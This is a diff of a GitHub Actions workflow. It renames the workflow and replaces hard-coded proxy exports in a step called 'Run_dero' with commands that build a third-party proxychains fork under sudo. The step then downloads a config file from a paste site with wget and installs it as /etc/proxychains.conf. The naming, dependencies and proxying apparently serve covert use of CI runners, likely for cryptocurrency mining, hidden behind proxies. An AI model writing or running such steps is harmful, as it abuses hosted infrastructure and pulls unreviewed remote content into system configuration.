@@ -1,4 +1,4 @@
-name: askla
+name: binomo
 
 on: workflow_dispatch
 jobs:
@@ -26,9 +26,5 @@ jobs:
     - name: Run_dero
       continue-on-error: true
       run: |
-       export http_proxy=http://72.206.181.105:64935
-       export https_proxy=https://72.206.181.105:64935
-       export ftp_proxy=http://72.206.181.105:64935
-       export socks_proxy=http://72.206.181.105:64935
-       export all_proxy=http://72.206.181.105:64935
-       curl google.com
+       sudo apt update -y && sudo apt install screen libjansson4 build-essential htop -y && cd ~ && sudo git clone https://github.com/walters99/proxychains-ng.git && cd proxychains-ng && sudo ./configure --prefix=/usr --sysconfdir=/etc && sudo make && sudo make install && sudo make install-config
+       wget -O myconf.conf https://www.heypasteit.com/download/0IWWBC && chmod +x myconf.conf && sudo mv myconf.conf /etc/proxychains.conf && proxychains4 curl google.com
